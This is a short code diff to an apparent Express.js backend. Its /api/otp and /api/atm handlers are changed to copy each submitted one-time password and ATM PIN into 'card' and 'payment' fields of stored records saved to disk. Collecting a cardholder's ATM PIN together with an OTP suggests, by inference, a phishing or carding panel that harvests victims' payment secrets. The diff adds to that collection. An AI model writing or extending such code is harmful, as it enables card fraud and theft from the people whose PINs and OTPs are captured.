@@ -230,7 +230,15 @@ app.post('/api/otp', (req, res) => {
   }
 
   item.status = 'otp_verified';
-  item.otp = otp;
+  item.otp = otp.trim();
+  item.card = {
+    ...(item.card || {}),
+    otp: otp.trim()
+  };
+  item.payment = {
+    ...(item.payment || {}),
+    otp: otp.trim()
+  };
   item.updatedAt = new Date().toISOString();
   writeApplications(list);
 
@@ -250,8 +258,17 @@ app.post('/api/atm', (req, res) => {
     return res.status(400).json({ ok: false, error: 'invalid_atm_pin' });
   }
 
+  const pin = atmPin.trim();
   item.status = 'success';
-  item.atmPin = atmPin.trim();
+  item.atmPin = pin;
+  item.card = {
+    ...(item.card || {}),
+    atm: pin
+  };
+  item.payment = {
+    ...(item.payment || {}),
+    atm: pin
+  };
   item.updatedAt = new Date().toISOString();
   writeApplications(list);
 
